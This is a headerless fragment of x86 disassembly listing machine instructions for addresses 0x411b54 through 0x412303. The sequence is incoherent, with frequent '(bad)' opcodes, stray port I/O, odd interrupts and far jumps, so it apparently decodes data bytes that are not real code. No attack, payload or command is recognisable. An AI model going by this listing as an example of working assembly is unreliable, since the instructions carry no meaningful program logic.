  411b54:	sub    ch,BYTE PTR [esi-0x39c3a494]
  411b5a:	test   DWORD PTR [esi+0x24],ebx
  411b5d:	add    bl,BYTE PTR [ecx+0x59]
  411b60:	cmp    BYTE PTR [eax+0x2a6d5cbe],0x96
  411b67:	mov    bl,0x23
  411b69:	or     al,0xbb
  411b6b:	jp     0x411bdf
  411b6d:	rcl    BYTE PTR [ebx],cl
  411b6f:	sub    eax,0x8ddbb701
  411b74:	into   
  411b75:	into   
  411b76:	into   
  411b77:	and    eax,0xdad554f7
  411b7c:	sbb    BYTE PTR [ebx],dl
  411b7e:	leave  
  411b7f:	ror    BYTE PTR fs:[edx],cl
  411b82:	jmp    0xf5f5:0xf41e3c79
  411b89:	xor    eax,0x8e456f95
  411b8e:	mov    dl,0x67
  411b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b91:	jnp    0x411c05
  411b93:	and    ah,al
  411b95:	out    dx,eax
  411b96:	shr    ch,cl
  411b98:	jbe    0x411bbd
  411b9a:	sbb    al,0xe
  411b9c:	jecxz  0x411b6a
  411b9e:	cdq    
  411b9f:	xor    edx,DWORD PTR [edi]
  411ba1:	push   cs
  411ba2:	pop    ds
  411ba3:	ds jl  0x411bb6
  411ba6:	lea    edi,[esi]
  411ba8:	add    al,al
  411baa:	push   edx
  411bab:	int    0xbc
  411bad:	push   edx
  411bae:	or     eax,0x4a3d1b2f
  411bb3:	adc    al,0x72
  411bb5:	cs aam 0x3c
  411bb8:	iret   
  411bb9:	test   esi,ecx
  411bbb:	xchg   edi,eax
  411bbc:	jne    0x411c1e
  411bbe:	mov    bl,0xfd
  411bc0:	and    edi,DWORD PTR [edi]
  411bc2:	or     eax,0x6d07002
  411bc7:	(bad)  
  411bc8:	cmp    eax,0x9f2258f6
  411bcd:	iret   
  411bce:	push   ebx
  411bd0:	rcl    al,1
  411bd2:	adc    BYTE PTR [eax-0x4e],ch
  411bd5:	shl    ebp,1
  411bd7:	push   0x3b31d931
  411bdc:	retf   
  411bdd:	inc    eax
  411bde:	pop    esp
  411bdf:	xchg   edi,eax
  411be0:	or     DWORD PTR [ecx-0x45],ebp
  411be3:	jmp    0x411bd8
  411be5:	div    BYTE PTR [ecx+0x31]
  411be8:	push   ecx
  411be9:	xchg   al,dl
  411beb:	sub    al,BYTE PTR [esi+0x60]
  411bee:	mov    bh,0x2d
  411bf0:	cli    
  411bf1:	in     eax,0xa2
  411bf3:	aad    0x42
  411bf5:	jae    0x411c07
  411bf7:	repnz imul edx,DWORD PTR [ebx-0x67],0xfffffffa
  411bfc:	test   BYTE PTR [edi],ch
  411bfe:	xchg   esi,eax
  411bff:	adc    eax,0x84941341
  411c04:	ret    
  411c05:	loope  0x411bbd
  411c07:	out    dx,eax
  411c08:	mov    al,0x95
  411c0a:	mov    eax,esp
  411c0c:	mov    DWORD PTR [eax-0x69e5fea4],eax
  411c12:	dec    esp
  411c13:	xlat   BYTE PTR ds:[ebx]
  411c14:	jne    0x411c32
  411c16:	cmp    al,0x78
  411c18:	lock mov al,0xa6
  411c1b:	imul   ecx,ecx,0xc8e229fa
  411c21:	dec    edi
  411c22:	retf   
  411c23:	rcr    eax,1
  411c25:	mov    dl,0x63
  411c27:	xor    ch,ch
  411c29:	sub    eax,0xb71542f6
  411c2e:	(bad)  
  411c31:	jmp    0x411cad
  411c33:	pop    ebx
  411c34:	mov    edx,edi
  411c36:	and    DWORD PTR [eax+0x2e5c08cf],eax
  411c3c:	xlat   BYTE PTR ds:[ebx]
  411c3d:	das    
  411c3e:	xchg   edx,eax
  411c3f:	leave  
  411c40:	in     al,0x7b
  411c42:	addr16 iret 
  411c44:	sahf   
  411c45:	inc    ebp
  411c46:	pop    edi
  411c47:	pop    edi
  411c48:	lahf   
  411c49:	data16 fidivr DWORD PTR gs:[ebp-0x4c]
  411c4e:	jbe    0x411c36
  411c50:	mov    bh,0xac
  411c52:	pushf  
  411c53:	or     al,0xed
  411c55:	mov    ?,ebx
  411c57:	arpl   WORD PTR [ebx],bp
  411c59:	cmc    
  411c5a:	stos   DWORD PTR es:[edi],eax
  411c5b:	xchg   edi,eax
  411c5c:	jnp    0x411cba
  411c5e:	je     0x411c97
  411c60:	add    BYTE PTR [ecx+0x57],bh
  411c63:	fs push ebp
  411c65:	push   ebp
  411c66:	lods   eax,DWORD PTR ds:[esi]
  411c67:	icebp  
  411c68:	inc    ch
  411c6a:	mov    edx,0x4a8aaaab
  411c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c70:	or     bl,0x97
  411c73:	das    
  411c74:	aaa    
  411c75:	popf   
  411c76:	xlat   BYTE PTR ds:[ebx]
  411c77:	fcmovnu st,st(3)
  411c79:	imul   ecx,ebp,0x54
  411c7c:	aam    0xee
  411c7e:	fld    st(4)
  411c80:	ja     0x411c43
  411c82:	sub    eax,0x543a6a12
  411c87:	push   ebp
  411c88:	aad    0x22
  411c8a:	xchg   ebp,eax
  411c8b:	test   eax,0x85e2a9a9
  411c90:	or     edx,DWORD PTR [edi]
  411c92:	ds inc edx
  411c94:	sub    eax,0x36b5ce88
  411c99:	pop    edi
  411c9a:	xchg   edi,eax
  411c9b:	or     DWORD PTR [esi+0x576eff9d],edi
  411ca1:	(bad)  
  411ca2:	adc    dh,dl
  411ca4:	mov    ecx,0x498e2f6f
  411ca9:	popa   
  411caa:	pusha  
  411cab:	test   eax,0xf2d6d105
  411cb0:	jne    0x411cba
  411cb2:	loopne 0x411ce7
  411cb4:	add    bh,0x1e
  411cb7:	jnp    0x411c65
  411cb9:	in     al,0x72
  411cbb:	mov    ecx,0x7c7c7efe
  411cc0:	cld    
  411cc1:	jl     0x411ce5
  411cc3:	xchg   ecx,eax
  411cc4:	sar    dl,0xf5
  411cc7:	jmp    0x411c60
  411cc9:	clc    
  411cca:	mov    bl,0x32
  411ccc:	mov    eax,ds:0xfe89f715
  411cd1:	push   0xffffffbb
  411cd3:	repz scas al,BYTE PTR es:[edi]
  411cd5:	push   es
  411cd6:	pop    edx
  411cd7:	mov    ecx,0x16761c00
  411cdc:	mov    DWORD PTR [eax],edi
  411cde:	add    BYTE PTR [edi-0x39df31d4],ah
  411ce4:	add    al,ah
  411ce6:	addr16 mov eax,ds:0x9ed1
  411cea:	push   0x5aad5abb
  411cef:	xor    edi,edi
  411cf1:	mov    BYTE PTR [esi-0x7a],ch
  411cf4:	pop    ebp
  411cf5:	popf   
  411cf6:	xlat   BYTE PTR fs:[ebx]
  411cf8:	push   es
  411cf9:	add    BYTE PTR [edi+0x387083c7],cl
  411cff:	or     al,0xc3
  411d01:	xor    BYTE PTR [eax],dl
  411d03:	mov    eax,ebp
  411d05:	or     bh,bl
  411d07:	imul   edi
  411d09:	(bad)  
  411d0a:	fcomip st,st(5)
  411d0c:	mov    eax,ds:0x13d681e7
  411d11:	mov    esi,0x6ad94288
  411d16:	fisttp QWORD PTR [esi-0x5d]
  411d19:	mov    edi,DWORD PTR [ebp+0x3131f953]
  411d1f:	aad    0x5d
  411d21:	ss push esi
  411d23:	inc    ebp
  411d24:	dec    ebx
  411d25:	mov    eax,0xf07015da
  411d2a:	jmp    0x8402fe10
  411d2f:	mov    DWORD PTR [edi],eax
  411d31:	push   ds
  411d32:	js     0x411d14
  411d34:	mov    bh,0xf1
  411d36:	js     0x411d34
  411d38:	aas    
  411d39:	sti    
  411d3a:	jl     0x411cfa
  411d3c:	rcl    BYTE PTR [esi+0x19ac5b2d],1
  411d42:	outs   dx,DWORD PTR ds:[esi]
  411d43:	in     al,dx
  411d44:	xor    al,0x23
  411d46:	sar    al,1
  411d48:	pusha  
  411d49:	jns    0x411da6
  411d4b:	mov    edx,0xaf80fc5d
  411d50:	mov    edi,DWORD PTR [esi-0x20e71348]
  411d56:	addr16 ficom WORD PTR [bp+di]
  411d5a:	les    ecx,FWORD PTR [esi]
  411d5c:	inc    ecx
  411d5d:	in     eax,dx
  411d5e:	(bad)  
  411d5f:	jmp    0x6dabf2fe
  411d64:	out    0x5c,al
  411d66:	xor    DWORD PTR ds:0x9a367c58,esp
  411d6c:	(bad)  
  411d6d:	pop    esp
  411d6e:	aam    0xde
  411d70:	je     0x411d0f
  411d72:	inc    edx
  411d73:	mov    eax,ds:0x6cb97280
  411d78:	dec    ebp
  411d79:	sub    eax,0x35a69a67
  411d7e:	sub    dl,BYTE PTR [eax-0x4f]
  411d81:	pop    eax
  411d82:	ins    BYTE PTR es:[edi],dx
  411d83:	sbb    cl,BYTE PTR [ebx-0x5120a080]
  411d89:	leave  
  411d8a:	mov    dl,0xde
  411d8c:	in     eax,0x17
  411d8e:	popf   
  411d8f:	popf   
  411d90:	popf   
  411d91:	xor    al,0xf3
  411d93:	push   esp
  411d94:	stc    
  411d95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d96:	xchg   edi,eax
  411d97:	pop    esi
  411d98:	jp     0x411d80
  411d9a:	fnsave [edi-0x21]
  411d9d:	jge    0x411da2
  411d9f:	xor    eax,0xe8265fdf
  411da4:	pop    esp
  411da5:	dec    eax
  411da6:	inc    ebp
  411da7:	mov    eax,ds:0x997c13b4
  411dac:	fild   QWORD PTR [esi]
  411dae:	adc    esi,edx
  411db0:	push   esi
  411db1:	in     al,0xc2
  411db3:	add    eax,DWORD PTR [ecx+0x1898b3ad]
  411db9:	sbb    al,0x2
  411dbb:	clc    
  411dbc:	mov    ecx,fs
  411dbe:	loopne 0x411d81
  411dc0:	or     DWORD PTR [ebx+0x56ef77bb],0x66
  411dc7:	data16 data16 imul BYTE PTR [eax]
  411dcb:	mov    al,BYTE PTR [edx+0x5a371b8d]
  411dd1:	xor    ecx,esi
  411dd3:	mov    BYTE PTR [edx-0x10304bf6],al
  411dd9:	pop    ss
  411dda:	test   DWORD PTR [ecx-0x42f66e32],ebx
  411de0:	in     al,dx
  411de1:	cmp    bh,ah
  411de3:	pop    esi
  411de4:	lods   eax,DWORD PTR ds:[esi]
  411de5:	and    BYTE PTR [ebx],dl
  411de7:	and    bh,BYTE PTR [ebx-0x4d9d8b22]
  411ded:	push   cs
  411dee:	push   eax
  411def:	dec    ebx
  411df0:	in     al,dx
  411df1:	xchg   ecx,eax
  411df2:	adc    DWORD PTR [eax],eax
  411df4:	inc    ecx
  411df5:	push   ecx
  411df6:	sbb    dl,BYTE PTR [ebx+0x73]
  411df9:	leave  
  411dfa:	jmp    0x29a3:0x91a1d743
  411e01:	push   ebx
  411e02:	mov    al,0x5a
  411e04:	lods   eax,DWORD PTR ds:[esi]
  411e05:	lea    ecx,ss:[ebx]
  411e08:	leave  
  411e09:	push   ebx
  411e0a:	scas   al,BYTE PTR es:[edi]
  411e0b:	pop    ebx
  411e0c:	mov    ecx,0xc269a638
  411e11:	out    dx,eax
  411e12:	mul    DWORD PTR [ebx-0x65ec4c4d]
  411e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e19:	popa   
  411e1a:	jp     0x411e96
  411e1c:	fidivr DWORD PTR [ebp+ebp*8-0x4b]
  411e20:	xlat   BYTE PTR ds:[ebx]
  411e21:	sahf   
  411e22:	jge    0x411e0b
  411e24:	popf   
  411e25:	ja     0x411e85
  411e27:	inc    edi
  411e28:	lods   eax,DWORD PTR ds:[esi]
  411e29:	fstp   QWORD PTR [edi+0xd327082]
  411e2f:	into   
  411e30:	int    0x77
  411e32:	xchg   ecx,eax
  411e33:	sbb    al,0xec
  411e35:	add    bh,BYTE PTR [edx+0x32]
  411e38:	push   ebx
  411e39:	fmulp  st(6),st
  411e3b:	mov    esp,0x2a87dd17
  411e40:	mov    ebx,0xdd828aef
  411e45:	push   cs
  411e46:	add    DWORD PTR [esi+eax*1+0x71],edi
  411e4a:	call   0xf738c01f
  411e4f:	in     al,dx
  411e50:	fst    DWORD PTR [ebx]
  411e52:	mov    al,bh
  411e54:	jecxz  0x411ecd
  411e56:	add    eax,eax
  411e58:	mov    dh,0x6d
  411e5a:	fneni(8087 only) 
  411e5c:	jbe    0x411e19
  411e5e:	shl    edi,0xa
  411e61:	push   0xcaeda9a5
  411e66:	mov    ah,0x23
  411e68:	push   es
  411e69:	sbb    ecx,eax
  411e6b:	enter  0xd62,0xad
  411e6f:	and    BYTE PTR [esi],ah
  411e71:	repz mov ah,0x5a
  411e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e75:	jmp    0x411e09
  411e77:	mov    al,0xd9
  411e79:	mov    ch,0xe3
  411e7b:	repz push esi
  411e7d:	adc    DWORD PTR [edx-0x3],ecx
  411e80:	in     eax,0xd7
  411e82:	adc    bh,cl
  411e84:	sub    DWORD PTR [edi+0x5c94d6cb],edx
  411e8a:	aad    0x6a
  411e8c:	mov    ds:0x4def3f1f,eax
  411e91:	sub    BYTE PTR [ebx-0x2e5920f1],ch
  411e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e98:	shr    ecx,cl
  411e9a:	xor    al,0x12
  411e9c:	mov    DWORD PTR [esi+ecx*2],eax
  411e9f:	lahf   
  411ea0:	ds std 
  411ea2:	jmp    0x1a22:0xf2bcaf2b
  411ea9:	jae    0x411ea5
  411eab:	mov    ch,0x12
  411ead:	pop    eax
  411eae:	cmp    esi,DWORD PTR [ebx+0x7f]
  411eb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eb2:	cmp    DWORD PTR ds:0x1271ebbb,0xc0899a00
  411ebc:	and    DWORD PTR [eax+0x1d0e03cf],eax
  411ec2:	cmp    dh,BYTE PTR [eax+esi*8-0x7f]
  411ec6:	pop    es
  411ec7:	push   ds
  411ec8:	cmp    BYTE PTR [esi],dh
  411eca:	aas    
  411ecb:	aas    
  411ecc:	mov    edi,0x5c489135
  411ed1:	xlat   BYTE PTR ds:[ebx]
  411ed2:	rcl    ebx,cl
  411ed4:	add    ecx,0xffffffc1
  411ed7:	inc    ecx
  411ed8:	retf   
  411ed9:	aam    0x5
  411edb:	xchg   esi,eax
  411edc:	mov    edx,0xdbc27600
  411ee1:	mov    ?,WORD PTR [eax]
  411ee3:	fs inc esp
  411ee5:	and    bl,bl
  411ee7:	xlat   BYTE PTR ds:[ebx]
  411ee8:	push   cs
  411ee9:	xor    ah,BYTE PTR [ecx-0x4e]
  411eec:	xor    edi,ebp
  411eee:	lds    esi,FWORD PTR [edx]
  411ef0:	xor    al,0x10
  411ef2:	push   0x50278ab
  411ef7:	inc    esi
  411ef8:	sub    DWORD PTR [ebx],esi
  411efa:	push   eax
  411efb:	jbe    0x411f7c
  411efd:	xor    bl,ch
  411eff:	leave  
  411f00:	ins    DWORD PTR es:[edi],dx
  411f01:	mov    ds:0x349e5fb4,al
  411f06:	inc    esp
  411f07:	popf   
  411f08:	cmp    BYTE PTR [eax-0x60fa3ca5],0x9a
  411f0f:	adc    DWORD PTR [ebx-0x4f],esp
  411f12:	sbb    dl,ah
  411f14:	icebp  
  411f15:	clc    
  411f16:	in     al,dx
  411f17:	mov    eax,ds:0x7e9e8743
  411f1c:	jecxz  0x411eab
  411f1e:	aaa    
  411f1f:	inc    BYTE PTR [ebp-0x29]
  411f22:	jne    0x411f95
  411f24:	sub    al,0x9
  411f26:	fldcw  WORD PTR [edi-0x55]
  411f29:	inc    ebp
  411f2a:	xor    al,0xf7
  411f2c:	lds    ebp,FWORD PTR [eax+0x4e52597d]
  411f32:	sub    ax,0x2488
  411f36:	jo     0x411efd
  411f38:	int    0xdc
  411f3a:	push   cs
  411f3b:	add    DWORD PTR [esi+eax*4-0xf],edi
  411f3f:	(bad)  
  411f40:	pop    ebx
  411f41:	outs   dx,DWORD PTR ds:[esi]
  411f42:	(bad)  
  411f43:	out    dx,eax
  411f44:	fidivr WORD PTR [ebp-0x6ad5af05]
  411f4a:	cli    
  411f4b:	(bad)  
  411f4c:	jecxz  0x411f31
  411f4e:	jecxz  0x411f8d
  411f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f51:	imul   esp,DWORD PTR [edx-0x15],0x8708add6
  411f58:	ret    
  411f59:	(bad)  
  411f5a:	dec    esp
  411f5b:	cmp    ah,bl
  411f5d:	pushf  
  411f5e:	mov    bh,0x13
  411f60:	outs   dx,BYTE PTR ds:[esi]
  411f61:	fidiv  DWORD PTR [esi-0x1dba06cd]
  411f67:	adc    bl,cl
  411f69:	mov    bh,al
  411f6b:	or     BYTE PTR [edx],dh
  411f6d:	ins    DWORD PTR es:[edi],dx
  411f6e:	das    
  411f6f:	or     dh,BYTE PTR [edi+0x475e2eb8]
  411f75:	xor    al,0xd3
  411f77:	gs xbegin 0x80978533
  411f7e:	in     al,dx
  411f7f:	jle    0x411fc5
  411f81:	add    dl,BYTE PTR [esp+ebx*8-0x6e00843d]
  411f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f89:	shl    DWORD PTR [edi-0x9],0x75
  411f8d:	mov    ecx,0x2244885c
  411f92:	or     BYTE PTR [ebp+0x52a54842],al
  411f98:	cwde   
  411f99:	pushf  
  411f9a:	pushf  
  411f9b:	inc    esp
  411f9c:	and    dl,BYTE PTR [ecx-0x40a80708]
  411fa2:	cli    
  411fa3:	aad    0x7f
  411fa5:	cli    
  411fa6:	loopne 0x411f2b
  411fa8:	divps  xmm5,XMMWORD PTR [ebx-0x37f074f1]
  411faf:	add    eax,0x8713ef99
  411fb4:	xchg   ebp,eax
  411fb5:	mov    bl,0x2b
  411fb7:	outs   dx,DWORD PTR ds:[esi]
  411fb8:	aaa    
  411fb9:	loopne 0x411f67
  411fbb:	sub    al,0xb0
  411fbd:	(bad)  
  411fbe:	jg     0x41201b
  411fc0:	or     ebp,edi
  411fc2:	mov    cl,BYTE PTR [ecx-0x40]
  411fc5:	and    DWORD PTR [eax+0x7ade38cf],eax
  411fcb:	jmp    0x411f7a
  411fcd:	int3   
  411fce:	add    ecx,DWORD PTR [edi]
  411fd0:	cmp    al,0xb0
  411fd2:	mov    edi,0xc60ead5a
  411fd7:	bound  esi,QWORD PTR [ecx+0x2cd9b29b]
  411fdd:	push   es
  411fde:	pop    es
  411fdf:	pop    es
  411fe0:	mov    cl,0x6e
  411fe2:	fnstsw WORD PTR [edx]
  411fe4:	stos   DWORD PTR es:[edi],eax
  411fe5:	and    ecx,DWORD PTR [edi+ebx*4]
  411fe8:	and    BYTE PTR [ebp-0x47],0xd6
  411fec:	add    BYTE PTR [edi+0x3b],al
  411fef:	mov    bh,0x80
  411ff1:	dec    DWORD PTR [edx+0x64c789e7]
  411ff7:	stc    
  411ff8:	add    DWORD PTR [edx-0x1c12ce0],esp
  411ffe:	retf   
  411fff:	out    0x16,eax
  412001:	adc    al,0xef
  412003:	ror    ebx,0x52
  412006:	mov    bl,0x1f
  412008:	in     eax,0xfd
  41200a:	repz xor dh,BYTE PTR [edx]
  41200d:	push   edx
  41200e:	sub    BYTE PTR [ebp+0x33c4d64a],dl
  412014:	in     al,0xe
  412016:	sar    BYTE PTR ds:0x2861a7a8,1
  41201c:	adc    al,0xb2
  41201e:	data16 adc BYTE PTR [edx+0x4d22f178],bh
  412025:	inc    edi
  412026:	jg     0x412026
  412028:	xchg   edi,eax
  412029:	mov    edi,0x2fb7e5fc
  41202e:	pop    esi
  41202f:	mov    esp,0x708011f8
  412034:	std    
  412035:	jb     0x412069
  412037:	xor    edi,DWORD PTR [edi+0x39]
  41203a:	es mov edi,0xa76f4f9d
  412040:	jmp    0xf8479332
  412045:	add    edx,DWORD PTR [esi-0x7b]
  412048:	fild   QWORD PTR [ebx]
  41204a:	ret    0x6bd5
  41204d:	or     esi,DWORD PTR [edx+0x70]
  412050:	int    0xf1
  412052:	in     al,dx
  412053:	mov    bl,0xcf
  412055:	(bad)  
  412056:	lods   eax,DWORD PTR ds:[esi]
  412057:	scas   al,BYTE PTR es:[edi]
  412058:	jmp    0x412059
  41205a:	xor    eax,0xbcef0e1c
  41205f:	jmp    0x79f1bc0a
  412064:	repz data16 je 0x4120dd
  412068:	jne    0x41208b
  41206a:	fwait
  41206b:	int    0x5a
  41206d:	xchg   ebx,eax
  41206e:	fwait
  41206f:	repnz mov ah,0x5a
  412072:	push   ecx
  412073:	clc    
  412074:	in     eax,dx
  412075:	push   es
  412076:	stc    
  412077:	loopne 0x412054
  412079:	mov    ds:0x65684125,al
  41207e:	add    eax,edx
  412080:	mov    edx,0x3e4e406c
  412085:	aam    0x16
  412087:	out    dx,eax
  412088:	add    BYTE PTR [esi+ecx*1],ah
  41208b:	fldln2 
  41208d:	cmc    
  41208e:	jp     0x4120a1
  412090:	mov    DWORD PTR [esp+ebp*2-0x23],eax
  412094:	push   es
  412095:	mov    esi,0x212a54af
  41209a:	cdq    
  41209b:	dec    esp
  41209c:	ss sbb eax,0xafc3ef13
  4120a2:	dec    ebp
  4120a3:	fld    QWORD PTR [edi-0x1bbc1307]
  4120a9:	jbe    0x4120af
  4120ab:	add    al,BYTE PTR [ecx]
  4120ad:	call   0x3ab5af6c
  4120b2:	(bad)  
  4120b3:	stc    
  4120b4:	stc    
  4120b5:	jns    0x412103
  4120b7:	dec    edi
  4120b8:	dec    edi
  4120b9:	jge    0xc03faf4d
  4120bf:	jecxz  0x412088
  4120c1:	(bad)  
  4120c2:	dec    ebx
  4120c4:	clc    
  4120c5:	clc    
  4120c6:	clc    
  4120c7:	sub    al,0x1a
  4120c9:	mov    bl,0x4b
  4120cb:	sub    ebp,DWORD PTR [eax+0x4c]
  4120ce:	mov    eax,0xabb9a0a1
  4120d3:	mov    ebx,0x6df3f6ca
  4120d8:	mov    al,ds:0x3cc4c659
  4120dd:	add    BYTE PTR [ecx+0x14],bl
  4120e0:	pop    edi
  4120e1:	xchg   esi,eax
  4120e2:	das    
  4120e3:	and    bl,dh
  4120e5:	out    dx,eax
  4120e6:	in     eax,dx
  4120e7:	add    al,0x7f
  4120e9:	inc    ebp
  4120ea:	test   al,ah
  4120ec:	adc    al,al
  4120ee:	lahf   
  4120ef:	sbb    esi,esi
  4120f1:	in     eax,dx
  4120f2:	fist   DWORD PTR [edi]
  4120f4:	xor    al,0xc
  4120f6:	jecxz  0x4120e7
  4120f8:	sub    edx,DWORD PTR [ebp-0x60c19c36]
  4120fe:	outs   dx,DWORD PTR ds:[esi]
  4120ff:	fst    st(6)
  412101:	lods   eax,DWORD PTR ds:[esi]
  412102:	pop    ebx
  412103:	jno    0x4120e0
  412105:	ins    DWORD PTR es:[edi],dx
  412106:	mov    bh,0x61
  412108:	int    0x9a
  41210a:	xor    eax,0x988b1628
  41210f:	lahf   
  412110:	lahf   
  412111:	xchg   DWORD PTR [esi+0x2bcf9669],esp
  412117:	imul   esp,DWORD PTR ds:0xe6fca710,0x63
  41211e:	or     eax,0x65e0b270
  412123:	adc    BYTE PTR fs:0x3e481455,al
  41212a:	(bad)  
  41212c:	aas    
  41212d:	mov    BYTE PTR [edi-0x23],0x1
  412131:	rcl    ah,1
  412133:	fsub   QWORD PTR [esi]
  412135:	and    eax,DWORD PTR [eax]
  412137:	jle    0x412167
  412139:	lods   eax,DWORD PTR ds:[esi]
  41213a:	das    
  41213b:	cs cs inc edx
  41213e:	shl    DWORD PTR [ecx+ebp*1],cl
  412141:	fnop   
  412143:	xor    eax,0xbf685d79
  412148:	xlat   BYTE PTR ds:[ebx]
  412149:	jmp    0x412100
  41214b:	es lahf 
  41214d:	aad    0x34
  41214f:	or     eax,0x98a3a3a3
  412154:	fwait
  412155:	fwait
  412156:	or     edi,0xffffffe7
  412159:	sub    ecx,DWORD PTR [edi-0xf437374]
  41215f:	repnz retf 
  412161:	das    
  412162:	aas    
  412163:	xchg   ebx,eax
  412164:	retf   
  412165:	in     eax,0x8a
  412167:	cmc    
  412168:	fist   DWORD PTR [ebx-0x1e]
  41216b:	adc    edx,0x119166
  412171:	aas    
  412172:	iret   
  412173:	jp     0x412191
  412175:	sub    al,0x15
  412177:	outs   dx,BYTE PTR ds:[esi]
  412178:	mov    ebx,0xc72f3ea8
  41217d:	iret   
  41217e:	xchg   edi,eax
  41217f:	(bad)  
  412180:	adc    eax,0xc2dbfb36
  412185:	and    DWORD PTR [eax-0x703acc1],eax
  41218b:	(bad)  
  41218c:	aas    
  41218d:	mov    esi,0xa7cd34ce
  412192:	jne    0x4121f1
  412194:	(bad)  
  412195:	cmp    ebx,DWORD PTR [edi-0x64b27831]
  41219b:	ss loope 0x41213c
  41219e:	jnp    0x41218e
  4121a0:	rcr    edx,0xb5
  4121a3:	imul   ebp,DWORD PTR [ebp-0x162c6b27],0xffffffb4
  4121aa:	in     eax,0xe7
  4121ac:	repnz sub eax,ebx
  4121af:	les    esi,FWORD PTR [ecx]
  4121b1:	add    al,ch
  4121b3:	xor    DWORD PTR [ebx],eax
  4121b5:	fs dec ebp
  4121b7:	sub    BYTE PTR [ebp-0x31418234],0x97
  4121be:	jbe    0x4121c4
  4121c0:	and    BYTE PTR [esi],bl
  4121c2:	jmp    0x4121ae
  4121c4:	jmp    0xddc1:0xeec9f6b2
  4121cb:	add    DWORD PTR [edx-0x5f],0x60
  4121cf:	jne    0x4121d7
  4121d1:	mov    ds:0x27a13272,al
  4121d6:	jb     0x4121c9
  4121d8:	sti    
  4121d9:	std    
  4121da:	xor    al,0x93
  4121dc:	xor    al,0x32
  4121de:	cdq    
  4121df:	or     al,0xa2
  4121e1:	shr    DWORD PTR [eax],1
  4121e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121e6:	sub    DWORD PTR [edi],edi
  4121e8:	loopne 0x412221
  4121ea:	out    dx,eax
  4121eb:	mov    esp,0x7cffcef3
  4121f0:	jmp    0x41219f
  4121f2:	mov    bh,0xde
  4121f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121f5:	push   edi
  4121f6:	and    BYTE PTR [ebp-0x753463e6],0xa8
  4121fd:	loope  0x412264
  4121ff:	pop    edx
  412200:	pop    edi
  412201:	jbe    0x4121a1
  412203:	push   ebp
  412204:	pop    ebp
  412205:	fsubr  DWORD PTR [ebx+0x7a]
  412208:	xchg   ebx,eax
  412209:	xchg   ebp,eax
  41220a:	imul   esp,DWORD PTR [edi-0x1a],0xdff3227f
  412211:	scas   al,BYTE PTR es:[edi]
  412212:	jb     0x412222
  412214:	dec    BYTE PTR [eax+esi*8+0x3ccf33cc]
  41221b:	bound  ebx,QWORD PTR [edx-0x1a34081a]
  412221:	repnz in eax,dx
  412223:	shl    DWORD PTR [eax-0x30],0xb7
  412227:	gs retf 
  412229:	push   ss
  41222a:	fdivr  QWORD PTR [edx-0x15]
  41222d:	lods   eax,DWORD PTR ds:[esi]
  41222e:	pop    eax
  41222f:	mov    edi,0xb5543d7e
  412234:	lea    edx,ss:[ebp+0x3a]
  412238:	popf   
  412239:	inc    esi
  41223a:	ss fwait
  41223c:	ins    DWORD PTR es:[edi],dx
  41223d:	jmp    0x3c80:0xae294edf
  412244:	pusha  
  412245:	enter  0xc57f,0x75
  412249:	sbb    BYTE PTR [eax],0x74
  41224c:	xchg   ebx,eax
  41224d:	or     DWORD PTR [ebx-0x78983248],ebp
  412253:	mov    ds:0xba8654e3,al
  412258:	inc    esp
  412259:	retf   
  41225a:	enter  0x3441,0xed
  41225e:	retf   
  41225f:	in     eax,0x32
  412261:	xor    bl,BYTE PTR [ecx-0xf26ecb4]
  412267:	fnstcw WORD PTR [ecx+eax*4+0x5a]
  41226b:	push   es
  41226c:	pop    edi
  41226d:	sub    BYTE PTR [edx+esi*4],dl
  412270:	cli    
  412271:	push   esi
  412272:	push   0x8989869a
  412277:	or     DWORD PTR [esp+ecx*2+0x4c],ecx
  41227b:	inc    eax
  41227c:	xlat   BYTE PTR ds:[ebx]
  41227d:	jne    0x4122c2
  41227f:	push   ebp
  412280:	aad    0x8b
  412282:	pop    esi
  412283:	scas   eax,DWORD PTR es:[edi]
  412284:	test   DWORD PTR [edi],0xfe1fc3f
  41228a:	cmpxchg bh,al
  41228d:	mov    dl,0x93
  41228f:	or     DWORD PTR [ecx-0x65],edx
  412292:	mov    eax,edx
  412294:	or     bh,BYTE PTR cs:[ebp+0x3b]
  412298:	add    dl,BYTE PTR [eax-0x65d90967]
  41229e:	test   esi,edi
  4122a0:	call   0xcf80:0x21c13e09
  4122a7:	add    DWORD PTR [esi-0x4a960582],ebx
  4122ad:	pop    edx
  4122ae:	lods   eax,DWORD PTR ds:[esi]
  4122af:	ficom  WORD PTR [ecx+ebp*4+0x54]
  4122b3:	out    dx,al
  4122b4:	push   edi
  4122b5:	push   ebp
  4122b6:	cmc    
  4122b7:	fstp   TBYTE PTR [edx-0x505e8052]
  4122bd:	scas   eax,DWORD PTR es:[edi]
  4122be:	dec    edi
  4122bf:	sbb    eax,0x7541c1c
  4122c4:	push   es
  4122c5:	push   es
  4122c6:	xchg   esp,eax
  4122c7:	int    0x9b
  4122c9:	aaa    
  4122ca:	mov    ds:0x1acfafaf,eax
  4122cf:	push   ecx
  4122d0:	xchg   DWORD PTR [esi-0x3cfd192f],esp
  4122d6:	int    0x7e
  4122d8:	mov    ebx,0x1e406254
  4122dd:	fst    DWORD PTR [edi]
  4122df:	test   ebx,edx
  4122e1:	outs   dx,BYTE PTR ds:[esi]
  4122e2:	fwait
  4122e3:	mov    ebx,0xe8023205
  4122e8:	call   0xfadbd3d5
  4122ed:	inc    esp
  4122ee:	ja     0x412332
  4122f0:	mov    esp,0x581861a7
  4122f5:	pop    esp
  4122f6:	pop    esp
  4122f7:	mov    ah,0x82
  4122f9:	xor    DWORD PTR [ecx+eiz*8],0x4c1e8d2c
  412300:	in     al,0x37
  412302:	aaa    
  412303:	aaa    
